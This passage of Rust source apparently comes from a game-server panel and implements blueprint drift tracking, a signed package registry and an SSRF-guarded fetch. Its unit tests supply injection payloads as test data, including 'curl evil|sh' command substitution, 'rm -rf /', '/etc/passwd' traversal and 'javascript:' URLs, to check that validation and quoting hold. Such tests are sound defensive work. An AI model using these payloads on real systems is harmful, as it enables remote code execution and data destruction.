    pub fields: Vec<String>,
}

/// Snapshot keys compared for drift; must stay in sync with `content_doc`.
const DRIFT_KEYS: [&str; 10] = [
    "name",
    "description",
    "author",
    "category",
    "runtime_hint",
    "startup",
    "stop_command",
    "default_config",
    "install_script",
    "variables",
];

/// Keys whose values differ between a pinned revision and current content.
pub fn diff_revisions(pinned: &serde_json::Value, current: &serde_json::Value) -> Vec<String> {
    DRIFT_KEYS
        .iter()
        .filter(|k| pinned.get(**k) != current.get(**k))
        .map(|k| k.to_string())
        .collect()
}

/// Drift report for every server on a blueprint. Servers behind the current
/// version get the key-level diff; `blueprint_version = 0` marks an unpinned
/// server; in-sync servers are omitted.
pub fn drift_for_blueprint(db: &Db, blueprint_id: i64) -> Result<Vec<Drift>> {
    let conn = db.get()?;
    let current_version: i64 = conn
        .query_row(
            "SELECT version FROM blueprints WHERE id=?1",
            [blueprint_id],
            |r| r.get(0),
        )
        .optional()?
        .ok_or_else(|| anyhow!("blueprint not found"))?;
    let current = content_doc(&blueprint_row(&conn, blueprint_id)?.unwrap());
    let mut stmt = conn.prepare(
        "SELECT id, name, blueprint_version FROM servers WHERE blueprint_id=?1 AND deleted=0 ORDER BY name",
    )?;
    let rows = stmt.query_map([blueprint_id], |r| {
        Ok((
            r.get::<_, i64>(0)?,
            r.get::<_, String>(1)?,
            r.get::<_, i64>(2)?,
        ))
    })?;
    let mut out = Vec::new();
    for row in rows {
        let (server_id, server_name, pinned_version) = row?;
        if pinned_version == 0 {
            out.push(Drift {
                server_id,
                server_name,
                pinned_version: 0,
                current_version,
                fields: vec!["unpinned".into()],
            });
            continue;
        }
        if pinned_version >= current_version {
            continue; // not behind
        }
        let snap_json: Option<String> = conn
            .query_row(
                "SELECT snapshot FROM blueprint_revisions WHERE blueprint_id=?1 AND version=?2",
                params![blueprint_id, pinned_version],
                |r| r.get(0),
            )
            .optional()?;
        // Dangling pin (revision deleted): nothing to diff against, skip.
        let Some(snap_json) = snap_json else { continue };
        let pinned: serde_json::Value = serde_json::from_str(&snap_json)?;
        out.push(Drift {
            server_id,
            server_name,
            pinned_version,
            current_version,
            fields: diff_revisions(&pinned, &current),
        });
    }
    Ok(out)
}

/// Pin a server to a blueprint revision, or `0` to unpin. The version must be a
/// real revision of the server's blueprint so drift always has a snapshot to
/// diff against.
pub fn pin_server(db: &Db, server_id: i64, version: i64) -> Result<()> {
    let conn = db.get()?;
    let blueprint_id: i64 = conn
        .query_row(
            "SELECT blueprint_id FROM servers WHERE id=?1 AND deleted=0",
            [server_id],
            |r| r.get(0),
        )
        .optional()?
        .ok_or_else(|| anyhow!("server not found"))?;
    if version != 0 {
        let exists: i64 = conn.query_row(
            "SELECT COUNT(*) FROM blueprint_revisions WHERE blueprint_id=?1 AND version=?2",
            params![blueprint_id, version],
            |r| r.get(0),
        )?;
        if exists == 0 {
            bail!("revision {version} does not exist for this blueprint");
        }
    }
    conn.execute(
        "UPDATE servers SET blueprint_version=?1 WHERE id=?2",
        params![version, server_id],
    )?;
    Ok(())
}

// ---------------- VoltSpec Registry ----------------

/// Stable package document schema. Packages carry this so a consumer can
/// refuse documents produced by a different (future) format instead of
/// mis-parsing them.
pub const REGISTRY_PACKAGE_SCHEMA: &str = "voltspec.registry.package.v1";

/// Deterministic canonical JSON: object keys sorted lexicographically, no
/// whitespace, scalars serialized exactly as `serde_json` would. Signer and
/// verifier on different machines derive byte-identical strings, which is
/// what makes a portable signature possible.
pub fn canonical_json(v: &serde_json::Value) -> String {
    match v {
        serde_json::Value::Object(map) => {
            let mut keys: Vec<&String> = map.keys().collect();
            keys.sort();
            let body = keys
                .iter()
                .map(|k| {
                    format!(
                        "{}:{}",
                        serde_json::to_string(k).expect("object key is a string"),
                        canonical_json(&map[*k])
                    )
                })
                .collect::<Vec<_>>()
                .join(",");
            format!("{{{body}}}")
        }
        serde_json::Value::Array(items) => {
            let body = items
                .iter()
                .map(canonical_json)
                .collect::<Vec<_>>()
                .join(",");
            format!("[{body}]")
        }
        other => serde_json::to_string(other).expect("scalar values always serialize"),
    }
}

/// Parse a hex-encoded ed25519 seed (64 hex chars) into a signing key.
/// The seed is the panel's private material; the verifying key is derived.
pub fn signing_key_from_hex(hex_key: &str) -> Result<ed25519_dalek::SigningKey> {
    let raw = hex::decode(hex_key.trim())
        .map_err(|_| anyhow!("registry signing key is not valid hex"))?;
    let bytes: [u8; 32] = raw
        .try_into()
        .map_err(|_| anyhow!("registry signing key must be exactly 32 bytes (64 hex chars)"))?;
    Ok(ed25519_dalek::SigningKey::from_bytes(&bytes))
}

/// Hex-encoded 32-byte ed25519 verifying key.
pub fn public_key_hex(key: &ed25519_dalek::SigningKey) -> String {
    hex::encode(ed25519_dalek::VerifyingKey::from(key).to_bytes())
}

/// Short display fingerprint (first 16 hex chars of SHA-256 over the public
/// key bytes) so operators can pin a publisher without pasting the full key.
pub fn public_key_fingerprint(public_hex: &str) -> String {
    match hex::decode(public_hex) {
        Ok(bytes) => hex::encode(Sha256::digest(&bytes))[..16].to_string(),
        Err(_) => String::new(),
    }
}

/// ed25519 signature (hex) over the canonical bytes of `doc` with the
/// `signature` field itself excluded — the signer and every verifier derive
/// the exact same byte string, so the signature stays valid across machines.
pub fn sign_package_doc(
    doc: &mut serde_json::Value,
    key: &ed25519_dalek::SigningKey,
) -> Result<String> {
    use ed25519_dalek::Signer;
    if let Some(obj) = doc.as_object_mut() {
        obj.remove("signature");
    }
    let msg = canonical_json(doc);
    let sig = key.sign(msg.as_bytes());
    Ok(hex::encode(sig.to_bytes()))
}

/// Verify a package's ed25519 signature when one is present.
/// Ok(true)  — signed and the signature is valid.
/// Ok(false) — unsigned package (accepted by import, surfaced as a warning).
/// Err       — a signature is present but does not verify: the package was
///              tampered with or claims a key it was not signed with, and is
///              rejected outright.
pub fn verify_package_signature(doc: &serde_json::Value) -> Result<bool> {
    use ed25519_dalek::Verifier;
    let Some(obj) = doc.as_object() else {
        bail!("registry package is not a JSON object");
    };
    let Some(sig_hex) = obj.get("signature").and_then(|v| v.as_str()) else {
        return Ok(false);
    };
    let pub_hex = obj
        .get("public_key")
        .and_then(|v| v.as_str())
        .ok_or_else(|| anyhow!("signed package is missing its public_key"))?;
    let pub_bytes: [u8; 32] = hex::decode(pub_hex)
        .map_err(|_| anyhow!("package public_key is not valid hex"))?
        .try_into()
        .map_err(|_| anyhow!("package public_key must be 32 bytes"))?;
    let sig_bytes: [u8; 64] = hex::decode(sig_hex)
        .map_err(|_| anyhow!("package signature is not valid hex"))?
        .try_into()
        .map_err(|_| anyhow!("package signature must be 64 bytes"))?;
    let vk = ed25519_dalek::VerifyingKey::from_bytes(&pub_bytes)
        .map_err(|e| anyhow!("package public_key is invalid: {e}"))?;
    let mut signed = serde_json::Value::Object(obj.clone());
    if let Some(o) = signed.as_object_mut() {
        o.remove("signature");
    }
    let msg = canonical_json(&signed);
    vk.verify(
        msg.as_bytes(),
        &ed25519_dalek::Signature::from_bytes(&sig_bytes),
    )
    .map_err(|_| {
        anyhow!("package signature is invalid (tampered or signed by a different key)")
    })?;
    Ok(true)
}

/// Stable package id derived from the blueprint name: lowercase with every run
/// of non-alphanumerics collapsed to a single dash. Only `[a-z0-9-]` can
/// survive, so the id is always safe as a filename segment.
pub fn package_id_from_name(name: &str) -> String {
    let slug = name
        .to_lowercase()
        .chars()
        .map(|c| if c.is_ascii_alphanumeric() { c } else { '-' })
        .collect::<String>();
    let slug = slug
        .split('-')
        .filter(|s| !s.is_empty())
        .collect::<Vec<_>>()
        .join("-");
    if slug.is_empty() {
        "package".into()
    } else {
        slug
    }
}

/// Registry root directory below the configured `blueprints_dir`: package
/// files live in `packages/`, import provenance sidecars in `provenance/`.
pub fn registry_root(base: &std::path::Path) -> std::path::PathBuf {
    base.join("registry")
}

/// Package ids are slug-derived, but import and fetch take them from request
/// bodies and URLs: refuse anything that could escape the packages directory
/// (`..`, `/`) or smuggle a non-slug segment into the filesystem path.
fn valid_package_id(id: &str) -> bool {
    !id.is_empty()
        && !id.contains("..")
        && !id.contains('/')
        && id
            .chars()
            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-')
}

fn packages_dir(root: &std::path::Path) -> std::path::PathBuf {
    root.join("packages")
}

fn provenance_dir(root: &std::path::Path) -> std::path::PathBuf {
    root.join("provenance")
}

/// One package file per published version: `{id}@{version}.json`.
pub fn package_path(root: &std::path::Path, id: &str, version: i64) -> std::path::PathBuf {
    packages_dir(root).join(format!("{id}@{version}.json"))
}

/// Metadata surfaced by the registry list endpoint.
#[derive(Debug, Clone, Serialize)]
pub struct RegistryPackageMeta {
    pub id: String,
    pub name: String,
    pub version: i64,
    pub publisher: String,
    pub description: String,
    pub published_at: String,
    pub digest: String,
    pub source_uuid: String,
    pub signed: bool,
    pub signature_valid: bool,
}

fn meta_field(doc: &serde_json::Value, key: &str) -> String {
    doc.get(key)
        .and_then(|v| v.as_str())
        .unwrap_or_default()
        .to_string()
}

/// VoltSpec exchange document for a blueprint — the same field set the
/// export/import endpoints speak, so a registry package round-trips through
/// `parse_blueprint_json` unchanged.
fn package_blueprint_doc(b: &Blueprint) -> serde_json::Value {
    let mut doc = serde_json::Map::new();
    doc.insert("name".into(), serde_json::json!(b.name));
    doc.insert("description".into(), serde_json::json!(b.description));
    doc.insert("author".into(), serde_json::json!(b.author));
    doc.insert("category".into(), serde_json::json!(b.category));
    doc.insert("runtime_hint".into(), serde_json::json!(b.runtime_hint));
    doc.insert("startup".into(), serde_json::json!(b.startup));
    doc.insert(
        "config".into(),
        b.default_config
            .as_deref()
            .and_then(|c| serde_json::from_str(c).ok())
            .unwrap_or(serde_json::Value::Null),
    );
    doc.insert(
        "install".into(),
        match &b.install_script {
            Some(s) => serde_json::json!({ "script": s }),
            None => serde_json::Value::Null,
        },
    );
    doc.insert("variables".into(), serde_json::json!(b.variables));
    doc.insert("stop".into(), serde_json::json!(b.stop_command));
    serde_json::Value::Object(doc)
}

/// Build the unsigned package document for a blueprint revision. `publish` is
/// admin-only and intentionally includes the full content (hidden input
/// defaults included) — publishing is the operator's explicit release action.
pub fn build_package_doc(b: &Blueprint, version: i64, publisher: &str) -> serde_json::Value {
    serde_json::json!({
        "schema": REGISTRY_PACKAGE_SCHEMA,
        "id": package_id_from_name(&b.name),
        "name": b.name,
        "version": version,
        "description": b.description,
        "publisher": publisher,
        "published_at": Utc::now().to_rfc3339(),
        "source_uuid": b.uuid,
        "digest": digest_of(b),
        "blueprint": package_blueprint_doc(b),
    })
}

/// Write a package to the registry. When a signing key is configured the
/// package is signed (public key + signature embedded); otherwise it is
/// stored unsigned and consumers install it with a visible warning. Files are
/// written atomically (temp sibling + rename) so a crash can never leave a
/// half-written package behind.
pub fn publish_package(
    root: &std::path::Path,
    doc: &mut serde_json::Value,
    seed_hex: Option<&str>,
) -> Result<()> {
    if let Some(seed) = seed_hex {
        let key = signing_key_from_hex(seed)?;
        if let Some(obj) = doc.as_object_mut() {
            obj.insert("public_key".into(), serde_json::json!(public_key_hex(&key)));
        }
        let sig = sign_package_doc(doc, &key)?;
        if let Some(obj) = doc.as_object_mut() {
            obj.insert("signature".into(), serde_json::json!(sig));
        }
    }
    let id = meta_field(doc, "id");
    if id.is_empty() {
        bail!("registry package has no id");
    }
    let version = doc
        .get("version")
        .and_then(|v| v.as_i64())
        .ok_or_else(|| anyhow!("registry package has no version"))?;
    let dest = package_path(root, &id, version);
    if let Some(parent) = dest.parent() {
        std::fs::create_dir_all(parent)?;
    }
    let tmp = dest.with_extension(format!("json.{}.tmp", uuid::Uuid::new_v4().simple()));
    std::fs::write(&tmp, serde_json::to_string_pretty(doc)?)?;
    std::fs::rename(&tmp, &dest)?;
    Ok(())
}

/// List every published package, newest version first. Unreadable or corrupt
/// files are skipped so one bad entry never blanks the whole catalog.
pub fn list_registry_packages(root: &std::path::Path) -> Result<Vec<RegistryPackageMeta>> {
    let dir = packages_dir(root);
    let mut out = Vec::new();
    if !dir.exists() {
        return Ok(out);
    }
    for entry in std::fs::read_dir(&dir)? {
        let entry = entry?;
        let Some(name) = entry.file_name().to_str().map(str::to_string) else {
            continue;
        };
        if !name.ends_with(".json") {
            continue;
        }
        let Ok(raw) = std::fs::read_to_string(entry.path()) else {
            continue;
        };
        let Ok(doc) = serde_json::from_str::<serde_json::Value>(&raw) else {
            continue;
        };
        if doc.get("version").and_then(|v| v.as_i64()).is_none() || meta_field(&doc, "id").is_empty()
        {
            continue;
        }
        let signed = doc.get("signature").and_then(|v| v.as_str()).is_some();
        let signature_valid = signed && verify_package_signature(&doc).unwrap_or(false);
        out.push(RegistryPackageMeta {
            id: meta_field(&doc, "id"),
            name: meta_field(&doc, "name"),
            version: doc["version"].as_i64().unwrap_or(1),
            publisher: meta_field(&doc, "publisher"),
            description: meta_field(&doc, "description"),
            published_at: meta_field(&doc, "published_at"),
            digest: meta_field(&doc, "digest"),
            source_uuid: meta_field(&doc, "source_uuid"),
            signed,
            signature_valid,
        });
    }
    out.sort_by(|a, b| {
        b.version
            .cmp(&a.version)
            .then_with(|| b.published_at.cmp(&a.published_at))
    });
    Ok(out)
}

/// Load a package by id+version, enforcing signature validity: a signed
/// package whose signature does not verify is rejected outright; an unsigned
/// package loads fine (the caller surfaces the warning).
pub fn load_registry_package(
    root: &std::path::Path,
    id: &str,
    version: i64,
) -> Result<serde_json::Value> {
    if !valid_package_id(id) {
        bail!("invalid registry package id");
    }
    let path = package_path(root, id, version);
    if !path.exists() {
        bail!("registry package '{id}@v{version}' not found");
    }
    let raw = std::fs::read_to_string(&path)?;
    let doc: serde_json::Value = serde_json::from_str(&raw)
        .map_err(|e| anyhow!("registry package '{id}@v{version}' is corrupt: {e}"))?;
    if doc.get("signature").and_then(|v| v.as_str()).is_some() {
        verify_package_signature(&doc)?;
    }
    Ok(doc)
}

/// Import provenance recorded next to the local blueprint: which package (and
/// source URL, for remote installs) produced this local blueprint, plus the
/// signature that was verified. Stored as a JSON sidecar under the registry's
/// `provenance/` directory, keyed by the local blueprint's uuid — no schema
/// change required.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PackageProvenance {
    pub package_id: String,
    pub version: i64,
    pub source_url: Option<String>,
    pub public_key: Option<String>,
    pub signature: Option<String>,
    pub verified: bool,
    pub installed_at: String,
}

fn valid_uuid_segment(uuid: &str) -> bool {
    !uuid.is_empty() && !uuid.contains('/') && !uuid.contains("..")
}

pub fn record_import_provenance(
    root: &std::path::Path,
    local_uuid: &str,
    prov: &PackageProvenance,
) -> Result<()> {
    if !valid_uuid_segment(local_uuid) {
        bail!("invalid local blueprint uuid");
    }
    let dir = provenance_dir(root);
    std::fs::create_dir_all(&dir)?;
    let dest = dir.join(format!("{local_uuid}.json"));
    let tmp = dest.with_extension(format!("json.{}.tmp", uuid::Uuid::new_v4().simple()));
    std::fs::write(&tmp, serde_json::to_string_pretty(prov)?)?;
    std::fs::rename(&tmp, &dest)?;
    Ok(())
}

pub fn read_import_provenance(
    root: &std::path::Path,
    local_uuid: &str,
) -> Result<Option<PackageProvenance>> {
    if !valid_uuid_segment(local_uuid) {
        return Ok(None);
    }
    let path = provenance_dir(root).join(format!("{local_uuid}.json"));
    if !path.exists() {
        return Ok(None);
    }
    Ok(Some(serde_json::from_str(&std::fs::read_to_string(&path)?)?))
}

/// Map every locally-installed blueprint uuid to its (package id, version).
/// The registry browser uses this to mark packages already installed here.
pub fn local_registry_installs(
    root: &std::path::Path,
) -> Result<std::collections::HashMap<String, (String, i64)>> {
    let dir = provenance_dir(root);
    let mut out = std::collections::HashMap::new();
    if !dir.exists() {
        return Ok(out);
    }
    for entry in std::fs::read_dir(&dir)? {
        let entry = entry?;
        let Some(name) = entry.file_name().to_str().map(str::to_string) else {
            continue;
        };
        if !name.ends_with(".json") {
            continue;
        }
        let uuid = name.trim_end_matches(".json");
        if let Ok(raw) = std::fs::read_to_string(entry.path()) {
            if let Ok(prov) = serde_json::from_str::<PackageProvenance>(&raw) {
                out.insert(uuid.to_string(), (prov.package_id, prov.version));
            }
        }
    }
    Ok(out)
}

/// Resolver that answers hyper's DNS queries with a pre-validated address set
/// only — the same DNS-rebinding defense the file-pull path uses. The request
/// URL keeps the original hostname (correct Host header and TLS SNI) while the
/// socket can only ever reach an address the SSRF guard approved.
#[derive(Clone)]
struct RegistryPinnedResolver {
    addrs: std::sync::Arc<Vec<std::net::SocketAddr>>,
}

impl tower_service::Service<hyper_util::client::legacy::connect::dns::Name>
    for RegistryPinnedResolver
{
    type Response = std::vec::IntoIter<std::net::SocketAddr>;
    type Error = std::io::Error;
    type Future = std::future::Ready<std::io::Result<Self::Response>>;

    fn poll_ready(
        &mut self,
        _cx: &mut std::task::Context<'_>,
    ) -> std::task::Poll<std::io::Result<()>> {
        std::task::Poll::Ready(Ok(()))
    }

    fn call(
        &mut self,
        _name: hyper_util::client::legacy::connect::dns::Name,
    ) -> Self::Future {
        std::future::ready(Ok((*self.addrs).clone().into_iter()))
    }
}

const REGISTRY_FETCH_CONNECT_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(10);
const REGISTRY_FETCH_STALL_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(30);
const REGISTRY_FETCH_MAX_REDIRECTS: usize = 5;

/// Fetch a registry package from a remote URL through the same SSRF guard the
/// file-pull path uses ([`crate::services::files::prepare_pull`]): the URL is
/// validated and the host resolved up front, the connection is pinned to
/// exactly the validated addresses, and every redirect hop is re-validated.
/// The response is size-capped and signature-verified.
pub async fn fetch_registry_package(url: &str, cap: usize) -> Result<serde_json::Value> {
    fetch_registry_package_impl(url, cap, REGISTRY_FETCH_MAX_REDIRECTS).await
}

async fn fetch_registry_package_impl(
    url: &str,
    cap: usize,
    max_redirects: usize,
) -> Result<serde_json::Value> {
    let mut current_url = url.to_string();
    for _ in 0..=max_redirects {
        let target = crate::services::files::prepare_pull(&current_url).await?;
        let mut http = hyper_util::client::legacy::connect::HttpConnector::new_with_resolver(
            RegistryPinnedResolver {
                addrs: std::sync::Arc::new(target.addrs.clone()),
            },
        );
        http.enforce_http(false);
        http.set_connect_timeout(Some(REGISTRY_FETCH_CONNECT_TIMEOUT));
        let https = hyper_rustls::HttpsConnectorBuilder::new()
            .with_webpki_roots()
            .https_or_http()
            .enable_http1()
            .enable_http2()
            .wrap_connector(http);
        let client: hyper_util::client::legacy::Client<
            hyper_rustls::HttpsConnector<
                hyper_util::client::legacy::connect::HttpConnector<RegistryPinnedResolver>,
            >,
            http_body_util::Full<hyper::body::Bytes>,
        > = hyper_util::client::legacy::Client::builder(hyper_util::rt::TokioExecutor::new())
            .build(https);
        let uri: hyper::Uri = target.url.as_str().parse()?;
        let response = tokio::time::timeout(REGISTRY_FETCH_STALL_TIMEOUT, client.get(uri))
            .await
            .map_err(|_| anyhow!("registry fetch timed out before a response"))??;
        let status = response.status();
        if status.is_redirection() {
            let location = response
                .headers()
                .get(hyper::header::LOCATION)
                .ok_or_else(|| anyhow!("registry fetch redirect without a Location header"))?
                .to_str()?;
            let next = target
                .url
                .join(location)
                .map_err(|e| anyhow!("registry fetch redirect to an invalid URL: {e}"))?;
            // Re-run the entire guard on the redirect target, exactly like the
            // file-pull path: a redirect into a private range is just as
            // dangerous as a direct one.
            current_url = next.to_string();
            continue;
        }
        if !status.is_success() {
            bail!("registry fetch failed: HTTP {status}");
        }
        let mut body = response.into_body();
        let mut bytes = Vec::new();
        while let Some(frame) = tokio::time::timeout(REGISTRY_FETCH_STALL_TIMEOUT, body.frame())
            .await
            .map_err(|_| anyhow!("registry fetch stalled: no data received"))?
        {
            let frame = frame.map_err(anyhow::Error::from)?;
            let chunk = frame
                .into_data()
                .map_err(|_| anyhow!("registry fetch response ended with trailers"))?;
            if bytes.len().saturating_add(chunk.len()) > cap {
                bail!("registry package exceeds the {} byte limit", cap);
            }
            bytes.extend_from_slice(&chunk);
        }
        let doc: serde_json::Value = serde_json::from_slice(&bytes)
            .map_err(|e| anyhow!("remote registry returned invalid JSON: {e}"))?;
        if doc.get("signature").and_then(|v| v.as_str()).is_some() {
            verify_package_signature(&doc)?;
        }
        return Ok(doc);
    }
    bail!("registry fetch exceeded {max_redirects} redirects");
}

/// True when a package document declares a signature.
pub fn package_is_signed(doc: &serde_json::Value) -> bool {
    doc.get("signature").and_then(|v| v.as_str()).is_some()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn bp() -> Blueprint {
        Blueprint {
            id: 1,
            uuid: "u1".into(),
            name: "minecraft".into(),
            description: "vanilla server".into(),
            author: "alice".into(),
            category: "game".into(),
            runtime_hint: "native".into(),
            startup: "java -Xmx1G -jar server.jar nogui".into(),
            default_config: Some(r#"{"server.properties": {}}"#.into()),
            install_script: Some("apt-get install -y openjdk-17".into()),
            variables: vec![BlueprintInput {
                name: "Version".into(),
                description: String::new(),
                env_var: "MC_VERSION".into(),
                default_value: "1.20.1".into(),
                user_viewable: true,
                user_editable: true,
                required: false,
                kind: InputKind::Text {
                    max_len: None,
                    pattern: None,
                },
            }],
            stop_command: "stop".into(),
            created_at: "t1".into(),
            updated_at: "t2".into(),
        }
    }

    #[test]
    fn digest_is_deterministic() {
        assert_eq!(digest_of(&bp()), digest_of(&bp()));
    }

    #[test]
    fn digest_changes_with_variable_default() {
        let mut b = bp();
        let before = digest_of(&b);
        b.variables[0].default_value = "1.21".into();
        assert_ne!(before, digest_of(&b));
    }

    #[test]
    fn digest_ignores_metadata() {
        let mut b = bp();
        let before = digest_of(&b);
        b.id = 99;
        b.updated_at = "later".into();
        assert_eq!(before, digest_of(&b));
    }

    #[test]
    fn diff_revisions_reports_only_changed_keys() {
        let pinned = content_doc(&bp());
        let mut cur = bp();
        cur.variables[0].default_value = "1.21".into();
        cur.description = "spigot server".into();
        assert_eq!(
            diff_revisions(&pinned, &content_doc(&cur)),
            vec!["description".to_string(), "variables".to_string()]
        );
        assert!(diff_revisions(&content_doc(&bp()), &content_doc(&bp())).is_empty());
    }

    #[test]
    fn content_equals_detects_noop() {
        assert!(content_equals(&bp(), &bp()));
        let mut changed = bp();
        changed.default_config = Some(r#"{"server.properties":{"motd":"hi"}}"#.into());
        assert!(!content_equals(&bp(), &changed));
        // Author is a mutable content field: an author-only patch is NOT a
        // no-op — it must create a revision, never be skipped. The digest
        // agrees with the snapshot comparison, so the revision written for an
        // author-only change never duplicates its predecessor's digest.
        let mut author = bp();
        author.author = "bob".into();
        assert!(!content_equals(&bp(), &author));
        assert_ne!(digest_of(&bp()), digest_of(&author));
    }

    #[test]
    fn digest_changes_with_author() {
        let mut b = bp();
        let before = digest_of(&b);
        b.author = "carol".into();
        assert_ne!(before, digest_of(&b));
    }

    #[test]
    fn validate_value_requires_missing_input() {
        let mut var = bp().variables[0].clone();
        var.required = true;
        let err = validate_value(&var, "  ").unwrap_err();
        assert!(err.to_string().contains("MC_VERSION"), "got: {err}");
    }

    #[test]
    fn validate_value_rejects_invalid_typed_default() {
        let mut var = bp().variables[0].clone();
        var.kind = InputKind::Number {
            min: Some(1.0),
            max: Some(64.0),
        };
        assert!(validate_value(&var, "lots").is_err());
        assert!(validate_value(&var, "0").is_err());
        assert!(validate_value(&var, "4").is_ok());
        var.kind = InputKind::Path { max_len: None };
        assert!(validate_value(&var, "../etc/passwd").is_err());
        assert!(validate_value(&var, "/etc/passwd").is_err());
        assert!(validate_value(&var, "data/db.sqlite").is_ok());
    }

    #[test]
    fn validate_value_rejects_non_finite_numbers() {
        let mut var = bp().variables[0].clone();
        var.kind = InputKind::Number {
            min: Some(1.0),
            max: None,
        };
        // NaN passes `v < min`/`v > max` (both false) and `1e999`/`inf`
        // slip past a missing max bound.
        for bad in ["NaN", "nan", "inf", "-inf", "1e999"] {
            let err = validate_value(&var, bad).unwrap_err();
            assert!(
                err.to_string().contains("finite number"),
                "accepted {bad}: {err}"
            );
        }
        assert!(validate_value(&var, "4").is_ok());
    }

    #[test]
    fn validate_value_rejects_injectable_urls() {
        let mut var = bp().variables[0].clone();
        var.kind = InputKind::Url;
        assert!(validate_value(&var, "https://example.com/dl.zip").is_ok());
        assert!(validate_value(&var, "https://example.com/dl?a=1&b=2").is_ok());
        for bad in [
            "https://example.com/$(curl evil|sh)",
            "https://example.com/`id`",
            "http://exa;mple.com/x",
            "http://exa$mple.com/x",
            "http://",
            "javascript:alert(1)",
            "https://example.com/a b",
            "https://example.com/\u{0000}",
        ] {
            assert!(
                validate_value(&var, bad).is_err(),
                "accepted injectable url: {bad}"
            );
        }
    }

    #[test]
    fn command_render_quotes_injection_payload() {
        // Safe values stay bare so multi-argument startups keep their shape.
        let mut values = HashMap::new();
        values.insert("input.MEMORY".into(), "1024".into());
        values.insert("input.ENTRYPOINT".into(), "server.jar".into());
        values.insert("workspace.name".into(), "srv".into());
        let ctx = TemplateCtx {
            values,
            secrets: HashMap::new(),
        };
        assert_eq!(
            render_command("java -Xmx${input.MEMORY}M -jar ${input.ENTRYPOINT} nogui", &ctx).unwrap(),
            "java -Xmx1024M -jar server.jar nogui"
        );

        // A `; curl` payload becomes one inert quoted argument.
        let mut values = HashMap::new();
        values.insert("input.MC_VERSION".into(), "1.20.1; curl evil|sh".into());
        values.insert("workspace.name".into(), "srv".into());
        let ctx = TemplateCtx {
            values,
            secrets: HashMap::new(),
        };
        assert_eq!(
            render_command("echo ${input.MC_VERSION}", &ctx).unwrap(),
            "echo '1.20.1; curl evil|sh'"
        );

        // Embedded quotes are escaped so the value cannot close the quoting.
        let mut values = HashMap::new();
        values.insert("input.X".into(), "it's; rm -rf /".into());
        let ctx = TemplateCtx {
            values,
            secrets: HashMap::new(),
        };
        assert_eq!(
            render_command("echo ${input.X}", &ctx).unwrap(),
            "echo 'it'\\''s; rm -rf /'"
        );

        // workspace.name is quoted like an input when it flows into a command.
        let mut values = HashMap::new();
        values.insert("workspace.name".into(), "My Server".into());
        let ctx = TemplateCtx {
            values,
            secrets: HashMap::new(),
        };
        assert_eq!(
            render_command("echo ${workspace.name}", &ctx).unwrap(),
            "echo 'My Server'"
        );
        // ...but stays raw in the config-template context.
        assert_eq!(render("${workspace.name}", &ctx).unwrap(), "My Server");

        // Empty value becomes the empty word, not nothing.
        let mut values = HashMap::new();
        values.insert("input.X".into(), String::new());
        let ctx = TemplateCtx {
            values,
            secrets: HashMap::new(),
        };
        assert_eq!(render_command("set -- ${input.X}", &ctx).unwrap(), "set -- ''");
    }

    #[test]
    fn non_viewable_var_render_error_names_secret_channel() {
        let t = TestDb::new();
        let conn = t.db.get().unwrap();
        conn.execute(
            "UPDATE blueprints SET variables=?1 WHERE id=(SELECT blueprint_id FROM servers WHERE id=?2)",
            rusqlite::params![
                r#"[{"name":"Token","description":"","env_var":"API_KEY","default_value":"hunter2","user_viewable":false,"user_editable":false,"required":false,"kind":{"type":"text"}}]"#,
                t.sid
            ],
        )
        .unwrap();
        conn.execute(
            "UPDATE servers SET startup=?1 WHERE id=?2",
            rusqlite::params!["echo ${input.API_KEY}", t.sid],
        )
        .unwrap();
        drop(conn);
        let server = t.server();
        let err = resolve_startup(&t.db, &server).unwrap_err();
        // The declared-but-secret reference must not be reported as an unknown
        // placeholder: the message names the secret and its env-only channel.
        assert!(
            err.to_string().contains("secret variable"),
            "got: {err}"
        );
        assert!(
            err.to_string().contains("input.API_KEY"),
            "got: {err}"
        );
        assert!(
            !err.to_string().contains("unknown placeholder"),
            "got: {err}"
        );
    }

    #[test]
    fn install_kill_reaps_hung_child() {
        use std::os::unix::process::CommandExt;
        // process_group(0) mirrors the sandbox child's session-leader shape so
        // kill(-pid) cannot ever reach this test's own process group.
        let mut child = std::process::Command::new("sh")
            .arg("-c")
            .arg("sleep 60")
            .process_group(0)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn()
            .unwrap();
        let pid = child.id();
        let started = std::time::Instant::now();
        kill_install_tree(pid);
        let status = child.wait().unwrap();
        assert!(!status.success(), "killed child must exit non-zero");
        assert!(
            started.elapsed().as_secs() < 5,
            "SIGKILL did not reap the child promptly"
        );
    }

    #[test]
    fn export_import_roundtrip_preserves_config() {
        // Mirror the `config` field the export endpoint writes, then parse it
        // the way import does, and assert the parsed default config survives.
        let b = bp();
        let exported = serde_json::json!({
            "name": b.name,
            "description": b.description,
            "author": b.author,
            "category": b.category,
            "runtime_hint": b.runtime_hint,
            "startup": b.startup,
            "config": b.default_config
                .as_deref()
                .map(serde_json::from_str::<serde_json::Value>)
                .transpose()
                .unwrap(),
            "install": b.install_script.clone().map(|s| serde_json::json!({ "script": s })),
            "variables": b.variables,
            "stop": b.stop_command,
        });
        let imported: BlueprintImport =
            serde_json::from_str(&serde_json::to_string(&exported).unwrap()).unwrap();
        let original: serde_json::Value =
            serde_json::from_str(b.default_config.as_deref().unwrap()).unwrap();
        assert_eq!(imported.config.unwrap(), original);
    }

    static DB_SEQ: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);

    struct TestDb {
        db: Db,
        path: std::path::PathBuf,
        sid: i64,
    }

    impl TestDb {
        fn new() -> Self {
            let seq = DB_SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
            let path = std::env::temp_dir().join(format!(
                "voltpanel-blueprint-test-{}-{}.db",
                std::process::id(),
                seq
            ));
            let _ = std::fs::remove_file(&path);
            let db = crate::db::open(path.to_str().unwrap()).unwrap();
            let conn = db.get().unwrap();
            conn.execute(
                "INSERT INTO users(username,email,password_hash,created_at,updated_at)
                 VALUES('t','t@t','x','now','now')",
                [],
            )
            .unwrap();
            let uid = conn.last_insert_rowid();
            conn.execute(
                "INSERT INTO blueprints(uuid,name,description,author,category,runtime_hint,startup,default_config,install_script,variables,stop_command,created_at,updated_at)
